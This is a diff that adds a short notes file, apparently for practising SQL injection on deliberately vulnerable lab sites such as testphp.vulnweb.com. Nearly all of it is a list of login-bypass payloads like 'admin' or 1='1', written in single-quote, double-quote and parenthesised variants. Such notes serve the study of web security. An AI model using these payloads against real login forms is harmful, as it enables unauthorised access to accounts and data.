@@ -1,0 +1,26 @@
+http://lab.awh.exdemy.com/
+testphp.vulnweb.com
+
+user='admin' & pass='123password'
+'admin' or 1='1'
+'admin' or '1'='1'
+
+payload-1: admin' or 1='1      payload-2: admin' or '1'='1
+-------------------------------------------------------------------------
+
+user="admin" & pass="123password"
+"admin" or 1="1"
+"admin" or "1"="1"
+
+user=('admin') & pass=('123password')
+('admin') or 1=('1') 
+('admin') or ('1')=('1') 
+
+user=("admin") & pass=("123password")
+user=(('admin'))& pass=(('123password'))
+user=(("admin"))& pass=(("123password"))
+
+
+
+
+
